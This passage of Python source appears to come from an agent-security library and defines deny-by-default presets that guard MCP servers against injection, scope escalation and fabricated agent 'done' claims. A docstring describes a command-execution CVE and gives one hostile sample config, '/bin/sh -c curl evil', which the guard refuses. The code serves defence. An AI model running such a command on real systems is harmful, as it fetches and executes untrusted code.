            request, method_header=method_header, name_header=name_header
        )

    return {
        "preset_id": "mcp_spec_2026_07_header_integrity",
        "severity": "high",
        "default_action": "deny",
        "spec": "SEP-2243",
        "owasp": "MCP07",
        "check_request": _check_request,
        "header_error": HeaderBodyMismatchError,
        "method_header": method_header,
        "name_header": name_header,
        "advisory_url": (
            "https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/"
        ),
    }


# Named preset constant for ergonomic opt-in.
MCP_SPEC_2026_07_HEADER_INTEGRITY = mcp_spec_2026_07_header_integrity_defaults()


def mcp_schema_2020_12_contract_defaults(
    *,
    allow_internal_hosts: Sequence[str] = (),
) -> dict[str, Any]:
    """MCP SEP-2106 JSON Schema 2020-12 tool-contract preset (v0.8.49+).

    Two contract-layer controls for a tool's JSON Schema ``inputSchema``, composed
    from **existing** airlock primitives (no new engine, Pydantic-only core):

    - **External ``$ref`` denial (SEP-2106).** An implementation MUST NOT
      auto-dereference an external ``$ref`` URI: a fetched subschema is
      attacker-controlled input that redefines the tool contract at call time.
      ``check_tool_schema`` wires
      :class:`~agent_airlock.mcp_spec.schema_ref_guard.SchemaRefGuard`
      **deny-by-default** — any ``$ref`` that is not a within-document
      ``#/$defs/...`` pointer is refused (``SchemaRefError``). The guard **reuses**
      the shipped :class:`~agent_airlock.ssrf_egress_guard.SSRFEgressGuard` to
      classify an ``http(s)`` ref's host (an external ref pointing at loopback /
      cloud-metadata is both a contract and an SSRF problem).
    - **Composition-aware contract analysis.** ``analyze`` runs the JSON Schema
      2020-12 composition analyzer
      (:func:`~agent_airlock.scan.schema.analyze_schema`) which determines the
      permitted argument surface across ``oneOf`` / ``anyOf`` / ``allOf`` / ``not``
      / ``if``-``then``-``else`` / ``$ref`` / ``$defs`` / ``prefixItems`` branches,
      **deny-by-default**: a surface that is not provably closed, or that is
      ambiguous across branches, is reported for the policy to refuse. Silent
      partial validation is avoided — an unsupported keyword is reported and denied.

    Args:
        allow_internal_hosts: Hosts the composed SSRF guard may treat as internal
            when classifying an ``http(s)`` ref (empty = none).

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` keys, plus:

        - ``check_tool_schema(schema)`` — raises
          :class:`~agent_airlock.mcp_spec.schema_ref_guard.SchemaRefError` on an
          external ``$ref``; returns ``None`` on a clean schema.
        - ``analyze(schema)`` — returns a
          :class:`~agent_airlock.scan.schema.SchemaAnalysis` (permitted argument
          surface, closed/open/ambiguous state, external refs, unsupported keywords).
        - ``ref_guard`` — the underlying ``SchemaRefGuard``.
        - ``ref_error`` — the ``SchemaRefError`` type.
        - ``spec`` — ``"SEP-2106"`` (a spec proposal id, **not** a CVE).

    References:
        - MCP SEP-2106 — external ``$ref`` dereference restriction.
        - MCP 2026-07-28 specification (final).
        - JSON Schema 2020-12 — composition keywords.
    """
    from .mcp_spec.schema_ref_guard import SchemaRefError, SchemaRefGuard
    from .scan.schema import SchemaAnalysis, analyze_schema
    from .ssrf_egress_guard import SSRFEgressGuard

    ssrf = SSRFEgressGuard(
        allow_internal_hosts=tuple(allow_internal_hosts), deny_on_resolution_failure=False
    )
    ref_guard = SchemaRefGuard(ssrf_guard=ssrf)

    def _check_tool_schema(schema: Mapping[str, Any]) -> None:
        ref_guard.validate(schema)

    def _analyze(schema: Mapping[str, Any]) -> SchemaAnalysis:
        return analyze_schema(schema)

    return {
        "preset_id": "mcp_schema_2020_12_contract",
        "severity": "high",
        "default_action": "deny",
        "spec": "SEP-2106",
        "owasp": "MCP08",
        "check_tool_schema": _check_tool_schema,
        "analyze": _analyze,
        "ref_guard": ref_guard,
        "ref_error": SchemaRefError,
        "advisory_url": "https://modelcontextprotocol.io/specification/2026-07-28",
    }


# Named preset constant for ergonomic opt-in.
MCP_SCHEMA_2020_12_CONTRACT = mcp_schema_2020_12_contract_defaults()


def mcp_meta_trust_2026_07_defaults(
    *,
    pinned: MetaPin | None = None,
    escalation_tokens: frozenset[str] | None = None,
    max_meta_bytes: int = 16384,
) -> dict[str, Any]:
    """MCP 2026-07-28 ``_meta`` trust-boundary preset (v0.8.50+).

    The MCP 2026-07-28 final spec moves the client's protocol version, client info,
    and capabilities into an **unsigned** ``_meta`` object on every request. A server
    that keys an authorization or routing decision off those fields is trusting
    attacker-controlled data. Akamai's 2026-06-25 review put it plainly: "Because
    these fields lack cryptographic signing, if a server thoughtlessly trusts this
    metadata for routing or authorization decisions, a single malicious request can
    instantly lead to privilege escalation or cross-tenant data access."

    This preset is a **trust-boundary reading of the 2026-07-28 spec — NOT a SEP id
    and NOT a CVE.** Composed from **existing** airlock primitives (stdlib mapping
    traversal, no new engine, Pydantic-only core). Opt-in; wired like the
    header-integrity preset:

    - **``check_request(request, *, pinned=None)``** — reuses
      :func:`~agent_airlock.mcp_spec.meta_trust.validate_meta_trust`. With a
      :class:`~agent_airlock.mcp_spec.meta_trust.MetaPin` (the server-side, out-of-band
      entitlement — an OAuth claim, an mTLS identity, deployment config), any ``_meta``
      value that DISAGREES with the pin fails closed. With no pin, any ``_meta`` key
      asserting a capability/role/scope/permission that would BROADEN the call is
      refused (deny-by-default; the operator opts into a narrower ``escalation_tokens``
      set). Type + shape discipline always runs: ``_meta`` must be a mapping, identity/
      role values must be scalar, case/unicode-colliding keys are refused, and total
      ``_meta`` size is capped. Raises
      :class:`~agent_airlock.mcp_spec.meta_trust.MetaTrustError`, which carries a
      structured ``audit_event`` mapping for the audit log.

    Args:
        pinned: A default :class:`MetaPin` to check every request against (a per-call
            ``pinned=`` on ``check_request`` overrides it).
        escalation_tokens: The identity/privilege key-token set to deny without a pin
            (defaults to the module's capability/role/scope/permission/admin/tenant set).
        max_meta_bytes: Cap on the serialized ``_meta`` size (default 16384).

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` keys, a ``check_request`` callable, the ``meta_error`` type,
        and ``basis`` (this is **not** a SEP or CVE).

    References:
        - MCP 2026-07-28 specification (final) — ``_meta`` on every request.
        - Akamai (2026-06-25): client-controlled metadata manipulation.
    """
    from .mcp_spec.meta_trust import (
        DEFAULT_ESCALATION_TOKENS,
        MetaTrustConfig,
        MetaTrustError,
        validate_meta_trust,
    )

    cfg = MetaTrustConfig(
        escalation_tokens=(
            escalation_tokens if escalation_tokens is not None else DEFAULT_ESCALATION_TOKENS
        ),
        max_meta_bytes=max_meta_bytes,
    )
    bound_pin = pinned

    def _check_request(request: Mapping[str, Any], *, pinned: MetaPin | None = None) -> None:
        validate_meta_trust(request, pinned=pinned if pinned is not None else bound_pin, config=cfg)

    return {
        "preset_id": "mcp_meta_trust_2026_07",
        "severity": "high",
        "default_action": "deny",
        "basis": "2026-07-28 spec trust-boundary reading (not a SEP, not a CVE)",
        "owasp": "MCP07",
        "check_request": _check_request,
        "meta_error": MetaTrustError,
        "advisory_url": (
            "https://www.akamai.com/blog/security-research/"
            "new-mcp-specification-security-teams-must-prepare"
        ),
    }


# Named preset constant for ergonomic opt-in.
MCP_META_TRUST_2026_07 = mcp_meta_trust_2026_07_defaults()


def mcp_step_up_scope_2026_07_defaults(*, allow_scope_change: bool = False) -> dict[str, Any]:
    """MCP 2026-07-28 step-up scope-accumulation guard preset (SEP-2350 / SEP-2352, v0.8.52+).

    Closes a **temporal** privilege-escalation class. Between a tool call being
    *admitted* (authorised by a scope set from a specific authorization server) and it
    *executing*, an agent can complete an OAuth **step-up** that grants broader scopes;
    a server that re-reads the live token then runs the already-admitted call under the
    newly-broadened authority — a confused-deputy **scope accumulation**. SEP-2350
    (step-up authorization) and SEP-2352 (admission-time scope binding) formalise binding
    the authorising scope set to the admission point. Composed from **existing** airlock
    primitives (stdlib set operations + the shipped observability hook; no new engine,
    Pydantic-only core, in-process — not a proxy):

    - **``capture_admission(tool_name, *, scopes, issuer)``** — snapshot the exact
      authorising scope set at admission, bound to the credential's issuing
      authorization server (``issuer`` / RFC 9207 ``iss``).
    - **``check_execution(snapshot, *, live_scopes, live_issuer, allow_scope_change=None)``**
      — at execution, **refuse** if the live scope set differs from the snapshot.
      Broadening (the primary attack shape) *and* narrowing are denied; a live issuer
      that differs from the admitted one is **always** refused (RFC 9207 / SEP-2468) —
      a scope from a different authorization server can never satisfy another's snapshot.
      **Deny-by-default**; ``allow_scope_change=True`` is the explicit opt-out (scope-set
      change only, never the issuer binding), and even the opt-out path emits the
      decision through ``agent_airlock.observability.track_event``. Raises
      :class:`~agent_airlock.mcp_spec.step_up_scope_guard.ScopeAccumulationError`, which
      carries a structured ``audit_event`` (admitted vs live scope set, the delta, and
      the issuer of each).

    Args:
        allow_scope_change: Default opt-out for ``check_execution`` (a per-call
            ``allow_scope_change=`` overrides it). Defaults to ``False`` — never opt-in.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` keys, ``capture_admission`` / ``check_execution`` callables,
        the ``snapshot_type`` and ``scope_error`` types, and ``spec`` =
        ``"SEP-2350/SEP-2352"`` (spec proposal ids, **not** CVEs).

    References:
        - MCP 2026-07-28 specification (final).
        - SEP-2350 — step-up authorization; SEP-2352 — admission-time scope binding.
        - RFC 9207 / SEP-2468 — authorization-server issuer identification.
    """
    from .mcp_spec.step_up_scope_guard import (
        AdmissionScopeSnapshot,
        ScopeAccumulationError,
        capture_admission_snapshot,
        verify_scope_unchanged,
    )

    default_allow = allow_scope_change

    def _capture_admission(
        tool_name: str, *, scopes: Iterable[str] | str, issuer: str
    ) -> AdmissionScopeSnapshot:
        return capture_admission_snapshot(tool_name, scopes=scopes, issuer=issuer)

    def _check_execution(
        snapshot: AdmissionScopeSnapshot,
        *,
        live_scopes: Iterable[str] | str,
        live_issuer: str,
        allow_scope_change: bool | None = None,
    ) -> None:
        verify_scope_unchanged(
            snapshot,
            live_scopes=live_scopes,
            live_issuer=live_issuer,
            allow_scope_change=default_allow if allow_scope_change is None else allow_scope_change,
        )

    return {
        "preset_id": "mcp_step_up_scope_2026_07",
        "severity": "high",
        "default_action": "deny",
        "spec": "SEP-2350/SEP-2352",
        "owasp": "MCP07",
        "capture_admission": _capture_admission,
        "check_execution": _check_execution,
        "snapshot_type": AdmissionScopeSnapshot,
        "scope_error": ScopeAccumulationError,
        "advisory_url": "https://modelcontextprotocol.io/specification/2026-07-28",
    }


# Named preset constant for ergonomic opt-in.
MCP_STEP_UP_SCOPE_2026_07 = mcp_step_up_scope_2026_07_defaults()


def mcp_tasks_lifecycle_2026_07_defaults(*, allow_scope_change: bool = False) -> dict[str, Any]:
    """MCP 2026-07-28 Tasks-extension (SEP-1686) lifecycle guard preset (v0.8.53+).

    The Tasks extension is a **call-now, fetch-later** pattern: a request MAY return a
    task *handle*, and the client later polls ``tasks/get`` / ``tasks/update`` /
    ``tasks/cancel``. A long-lived handle creates two lifecycle risks this preset closes,
    **deny-by-default** — and it **extends** the existing MCP-2026-07-28 preset family
    (it reuses the SEP-2350 / SEP-2352 scope-change detector rather than re-implementing
    it; the on-the-wire task schema lives in :mod:`agent_airlock.mcp_spec.tasks`):

    - **(a)** at admission, a task handle is **bound** to the authorizing scope set +
      principal (and, optionally, the authorizing token's expiry);
    - **(b)** ``tasks/get`` / ``tasks/update`` / ``tasks/cancel`` are **refused** if the
      caller's current scope set no longer covers the task's admission scope (reusing
      :func:`~agent_airlock.mcp_spec.step_up_scope_guard.verify_scope_unchanged` — scope
      broadening/narrowing *and* a different issuer are refused), or if the authorizing
      token has expired;
    - **(c)** ``tasks/list`` is **removed** in the 2026-07-28 spec, so any client attempt
      to enumerate — or operate on — a task it did not receive a handle for is refused
      (deny-by-default; no cross-task / cross-principal enumeration).

    Every refusal raises
    :class:`~agent_airlock.mcp_spec.tasks_lifecycle_guard.TaskLifecycleError` (structured
    ``audit_event``) and the decision flows through ``observability.track_event`` — no new
    engine, Pydantic-only core, in-process (not a proxy).

    Args:
        allow_scope_change: Default opt-out for a *scope-set* change on ``check_task_op``
            (never relaxes the issuer binding). Defaults to ``False`` — never opt-in.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` keys, plus:

        - ``new_registry()`` — a fresh per-server admitted-handle registry.
        - ``admit_task(registry, task_id, *, scopes, issuer, principal, expires_at=None)``.
        - ``check_task_op(registry, method, task_id, *, live_scopes, live_issuer,
          principal, allow_scope_change=None, now=None)`` — raises on refusal.
        - ``admission_type`` / ``task_error`` types; ``spec`` = ``"SEP-1686"``.

    References:
        - MCP 2026-07-28 specification (final) — Tasks extension.
        - SEP-1686 — Tasks primitive; SEP-2350 / SEP-2352 — scope binding (reused).
    """
    from .mcp_spec.tasks_lifecycle_guard import (
        TaskAdmission,
        TaskLifecycleError,
        admit_task,
        check_task_op,
        new_registry,
    )

    default_allow = allow_scope_change

    def _admit_task(
        registry: TaskRegistry,
        task_id: str,
        *,
        scopes: Iterable[str] | str,
        issuer: str,
        principal: str,
        expires_at: float | None = None,
    ) -> TaskAdmission:
        return admit_task(
            registry,
            task_id,
            scopes=scopes,
            issuer=issuer,
            principal=principal,
            expires_at=expires_at,
        )

    def _check_task_op(
        registry: TaskRegistry,
        method: str,
        task_id: str,
        *,
        live_scopes: Iterable[str] | str,
        live_issuer: str,
        principal: str,
        allow_scope_change: bool | None = None,
        now: float | None = None,
    ) -> None:
        check_task_op(
            registry,
            method,
            task_id,
            live_scopes=live_scopes,
            live_issuer=live_issuer,
            principal=principal,
            allow_scope_change=default_allow if allow_scope_change is None else allow_scope_change,
            now=now,
        )

    return {
        "preset_id": "mcp_tasks_lifecycle_2026_07",
        "severity": "high",
        "default_action": "deny",
        "spec": "SEP-1686",
        "owasp": "MCP07",
        "new_registry": new_registry,
        "admit_task": _admit_task,
        "check_task_op": _check_task_op,
        "admission_type": TaskAdmission,
        "task_error": TaskLifecycleError,
        "advisory_url": "https://modelcontextprotocol.io/specification/2026-07-28",
    }


# Named preset constant for ergonomic opt-in.
MCP_TASKS_LIFECYCLE_2026_07 = mcp_tasks_lifecycle_2026_07_defaults()


def mcp_subprocess_arg_injection_guard_defaults(
    *,
    allowed_commands: Iterable[str] | None = None,
) -> dict[str, Any]:
    """Recommended config for the MCP-bridge subprocess-arg injection guard (v0.8.22+).

    CVE-2026-42271 (LiteLLM 1.74.2–1.83.6, CVSS 8.7, CWE-78, **CISA KEV
    2026-06-09**, actively exploited): the MCP server preview endpoints
    ``POST /mcp-rest/test/connection`` and ``POST /mcp-rest/test/tools/list``
    accepted a full MCP server configuration (stdio-transport ``command``
    / ``args`` / ``env``) in the request body and spawned it as a
    subprocess on the proxy host with no validation or sandboxing — any
    low-privilege API key reached arbitrary command execution; chained
    with CVE-2026-48710 (Starlette Host-header bypass) it becomes
    unauthenticated RCE. Fixed in LiteLLM 1.83.7.

    Wires
    :class:`agent_airlock.mcp_spec.subprocess_arg_guard.McpSubprocessArgInjectionGuard`
    deny-by-default: a model-/request-controlled config carrying
    spawn-shaped fields (``command`` / ``cmd`` / ``args`` / ``argv`` /
    ``env``) is refused unless its resolved program is on
    ``allowed_commands`` (explicitly-safe static commands), and an
    ``env`` carrying a code-loading variable (``LD_PRELOAD`` / ``PATH`` /
    ``PYTHONPATH`` / ...) is refused regardless. A config with no
    spawn-shaped fields (a plain data argument) is allowed.

    OWASP mapping: **ASI05 Unexpected Code Execution (RCE)** (OWASP Top-10
    for Agentic Applications); also OWASP MCP05 Command Injection; CWE-78.
    Composes one layer above the v0.7.6
    :class:`agent_airlock.mcp_spec.stdio_command_injection_guard.StdioCommandInjectionGuard`
    (which scans an *allowed* argv for shell metachars) — this preset
    decides whether the command is allowed to spawn at all.

    Args:
        allowed_commands: Program names (basename or absolute path) that
            may be spawned. Empty / None (default) denies every
            spawn-shaped config.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity``
        / ``default_action`` / ``advisory_url`` / ``cves`` keys, plus:

        - ``guard`` — a pre-built ``McpSubprocessArgInjectionGuard`` ready
          to ``evaluate(config)``.
        - ``check`` — convenience callable; ``check(config)`` raises
          :class:`McpSubprocessArgInjectionError` on a denied config and
          returns ``None`` on a safe one.
        - ``owasp`` — ``"ASI05"``.
        - ``cisa_kev`` — ``True`` (on the CISA Known Exploited
          Vulnerabilities catalog as of 2026-06-09).

    Usage::

        from agent_airlock.policy_presets import mcp_subprocess_arg_injection_guard_defaults

        preset = mcp_subprocess_arg_injection_guard_defaults(allowed_commands={"uvx"})
        preset["check"]({"command": "uvx", "args": ["mcp-server-foo"]})        # ok
        preset["check"]({"command": "/bin/sh", "args": ["-c", "curl evil"]})   # raises

    Primary source:
      https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-42271
    """
    from .mcp_spec.subprocess_arg_guard import (
        McpSubprocessArgDecision,
        McpSubprocessArgInjectionError,
        McpSubprocessArgInjectionGuard,
    )

    advisory_url = (
        "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-42271"
    )
    guard = McpSubprocessArgInjectionGuard(
        allowed_commands=allowed_commands,
        advisory="CVE-2026-42271",
        advisory_url=advisory_url,
    )

    def _check(config: Mapping[str, Any] | None) -> None:
        """Raise :class:`McpSubprocessArgInjectionError` on a denied spawn config."""
        decision: McpSubprocessArgDecision = guard.evaluate(config)
        if not decision.allowed:
            raise McpSubprocessArgInjectionError(decision)

    return {
        "preset_id": "mcp_subprocess_arg_injection_guard",
        "severity": "high",
        "default_action": "deny",
        "guard": guard,
        "check": _check,
        "owasp": "ASI05",
        "cves": ("CVE-2026-42271",),
        "cisa_kev": True,
        "advisory_url": advisory_url,
    }


def no_false_success_defaults(
    checks: Mapping[str, Any],
    *,
    run_token: str | None = None,
) -> dict[str, Any]:
    """Fail-closed terminal-claim guard preset (v0.8.25+, Goal-Autopilot).

    Goal-Autopilot (arXiv:2606.11688) enforces a hard floor for unattended
    long-horizon agents: **no terminal "done" claim is admitted unless its
    falsifiable gate actually executed and passed**, and the worst case
    degrades to an *honest stall, never a fabricated success*. This preset
    wires :class:`agent_airlock.done_receipt_guard.DoneReceiptGuard` with an
    operator-supplied registry of falsifiable checks keyed by claim.

    Honest stall is recoverable; a confident wrong ``done`` is not — so a
    failed verification returns ``allowed=False`` with ``recoverable=True``
    (run the named check and retry), it does not abort.

    Args:
        checks: Mapping of claim → falsifiable check (zero-arg ``() -> bool``).
            A check must be able to FAIL; one that can only return True is not
            falsifiable and provides no evidence.
        run_token: The per-run execution token. Defaults to a fresh random
            token; pass a fixed value only for deterministic tests.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` keys, plus:

        - ``guard`` — a pre-built ``DoneReceiptGuard``. Call ``guard.run(claim)``
          to execute a check this run, then ``guard.check_done(claim)``.
        - ``check`` — convenience callable; ``check(claim)`` raises
          :class:`NoFalseSuccessStall` on a fail-closed stall and returns the
          :class:`DoneClaimDecision` on an admitted claim.
        - ``owasp`` — ``"ASI06"`` (excessive agency / unverified autonomy).
        - ``advisory_url`` — the Goal-Autopilot paper.

    Usage::

        from agent_airlock.policy_presets import no_false_success_defaults

        preset = no_false_success_defaults({"tests_green": run_pytest})
        preset["guard"].run("tests_green")          # execute the check this run
        preset["check"]("tests_green")              # raises if it didn't pass

    Primary source:
      https://arxiv.org/abs/2606.11688
    """
    from .done_receipt_guard import (
        DoneClaimDecision,
        DoneReceiptGuard,
        NoFalseSuccessStall,
    )

    guard = DoneReceiptGuard(checks, run_token=run_token)

    def _check(claim: str) -> DoneClaimDecision:
        """Raise :class:`NoFalseSuccessStall` on a fail-closed honest stall."""
        decision = guard.check_done(claim)
        if not decision.allowed:
            raise NoFalseSuccessStall(decision)
        return decision

    return {
        "preset_id": "no_false_success",
        "severity": "high",
        "default_action": "deny",
        "guard": guard,
        "check": _check,
        "owasp": "ASI06",
        "advisory_url": "https://arxiv.org/abs/2606.11688",
    }


__all__ = [
    # Factory functions (stateless; use these for dynamic overrides)
    "gtg_1002_defense_policy",
    "mex_gov_2026_policy",
    "owasp_mcp_top_10_2026_policy",
    "eu_ai_act_article_15_policy",
    "india_dpdp_2023_policy",
    "apply_india_dpdp_2023",
    "IndiaDPDP2023Bundle",
    "stdio_guard_ox_defaults",
    "oauth_audit_vercel_2026_defaults",
    "azure_mcp_cve_2026_32211_defaults",
    "AZURE_MCP_CVE_2026_32211_DEFAULTS",
    "ox_mcp_supply_chain_2026_04_defaults",
    "unit42_mcp_sampling_defaults",
    "UNIT42_MCP_SAMPLING_DEFAULTS",
    "openclaw_cve_2026_41349_defaults",
    "openclaw_cve_2026_41361_ipv6_ssrf_defaults",
    "codebase_mcp_cve_2026_5023_defaults",
    "CodebaseMcpInjectionBlocked",
    "flux159_mcp_kubernetes_cve_2026_39884_defaults",
    "mcpjam_cve_2026_23744_defaults",
    "claude_managed_agents_safe_defaults",
    "archived_mcp_server_advisory_defaults",
    "ArchivedMcpServerBlocked",
    "gitpilot_mcp_cve_2026_6980_defaults",
    "GitPilotRepoPathInjection",
    "windsurf_cve_2026_30615_defaults",
    "mcp_config_pin",
    "claude_code_security_review_cnc_2026_04",
    "gemini_cli_action_cnc_2026_04",
    "copilot_agent_cnc_2026_04",
    "mcp_atlassian_cve_2026_27825",
    "lan_unauth_mcp_guard",
    "agent_commerce_default_caps",
    "offensive_cyber_model_defaults",
    "mcpwn_cve_2026_33032_defaults",
    "mcpwn_cve_2026_33032_check",
    "is_destructive_tool",
    "UnauthenticatedDestructiveToolError",
    "flowise_cve_2025_59528_defaults",
    "flowise_cve_2025_59528_check",
    "FlowiseEvalTokenError",
    "high_value_action_deny_by_default",
    "HighValueActionBlocked",
    "mcp_stdio_meta_cve_2026_04",
    "mcp_elicitation_guard_2026_04",
    "mcp_config_path_traversal_cve_2026_31402",
    "managed_agents_outcomes_2026_05_06_defaults",
    "semantic_kernel_filter_eval_rce_2026_25592_26030_defaults",
    "npm_oidc_publish_window_guard_defaults",
    "mcp_stdio_command_injection_preset_defaults",
    "stdio_guard_eval_defaults_2026_05_15",
    "mcp_inspector_exposure_guard_defaults",
    "mcp_calc_server_bundle_defaults_2026_05_15",
    "openapi_doc_drift_guard_defaults",
    "metis_inspired_corpus_block_rate_regression_defaults_2026_05_18",
    "stainless_provenance_probe_defaults",
    "gemini_3_agent_defaults",
    "oauth_state_injection_guard",
    "gpt_5_5_spud_agent_defaults",
    "agent_capability_default_caps",
    "PresetMeta",
    "list_active",
    # Eagerly constructed defaults
    "GTG_1002_DEFENSE",
    "MEX_GOV_2026",
    "OWASP_MCP_TOP_10_2026",
    "EU_AI_ACT_ARTICLE_15",
    "INDIA_DPDP_2023",
    "STDIO_GUARD_OX_DEFAULTS",
    "OAUTH_AUDIT_VERCEL_2026_DEFAULTS",
    # V0.8.7 per-model-tier cost budget
    "STRICT_MODEL_TIER_BUDGET",
    "strict_tier_budget_policy",
    # V0.8.8 CVE-2026-35394 Mobile MCP intent guard
    "mobile_mcp_intent_guard_2026_05",
    "MOBILE_MCP_INTENT_GUARD_2026_05_DEFAULTS",
    "MobileMcpIntentBlocked",
    # V0.8.14 CVE-2026-21520 (Capsule ShareLeak / PipeLeak) indirect injection
    "capsule_indirect_injection_cve_2026_21520_defaults",
    "CAPSULE_INDIRECT_INJECTION_CVE_2026_21520_DEFAULTS",
    # V0.8.16 CVE-2026-40933 (Flowise MCP-stdio adapter RCE)
    "flowise_mcp_stdio_guard_2026_defaults",
    "FlowiseMcpStdioInjectionError",
    # V0.8.18 DCIChecker (arXiv:2606.04769) description-vs-manifest guard
    "mcp_description_manifest_guard_defaults",
    # V0.8.19 CVE-2026-25874 (LeRobot pickle-over-unauthenticated-channel RCE)
    "lerobot_cve_2026_25874_defaults",
    "LEROBOT_CVE_2026_25874_DEFAULTS",
    # V0.8.20 CVE-2026-32625 (MCP server-URL env-interpolation secret leak)
    "mcp_server_env_interpolation_guard_defaults",
    # V0.8.21 CVE-2026-11393 (codegen triple-quote / delimiter break-out RCE)
    "codegen_delimiter_injection_guard_defaults",
    # V0.8.27 CVE-2026-44211 (Cline cross-origin WebSocket hijack; CWE-1385/CWE-306)
    "cline_cve_2026_44211_defaults",
    # V0.8.29 CVE-2026-47390 (SSRF-protection bypass via alt-encoding / rebinding; CWE-918)
    "ssrf_egress_guard_defaults",
    # V0.8.34 GHSA-mrvx-jmjw-vggc (SafeURL DNS-rebinding: resolve + re-validate at call time)
    "dns_rebinding_safe_url_defaults",
    # V0.8.30 CVE-2026-11624 (MCP HTTP-transport Origin/Host DNS-rebinding; CWE-346)
    "mcp_origin_host_guard_defaults",
    # V0.8.31 CVE-2026-53820 (OpenClaw exec-denylist bypass at MCP loopback session-spawn; CWE-693)
    "openclaw_cve_2026_53820_defaults",
    # V0.8.41 MCP 2026-07-28 final-spec hardening (SEP-2468 iss + server-card trust boundary)
    "mcp_spec_2026_07_defaults",
    "MCP_SPEC_2026_07",
    "mcp_stateless_conformance_2026_07_defaults",
    "MCP_STATELESS_CONFORMANCE_2026_07",
    "mcp_spec_2026_07_header_integrity_defaults",
    "MCP_SPEC_2026_07_HEADER_INTEGRITY",
    # V0.8.33 Agentjacking / CVE-2026-42824 (untrusted tool-OUTPUT instruction injection)
    "untrusted_tool_output_defaults",
    "UNTRUSTED_TOOL_OUTPUT",
    # V0.8.22 CVE-2026-42271 (LiteLLM MCP-bridge subprocess command/args/env RCE; CISA KEV)
    "mcp_subprocess_arg_injection_guard_defaults",
    # V0.8.25 Goal-Autopilot (arXiv:2606.11688) fail-closed terminal-claim guard
    "no_false_success_defaults",
]
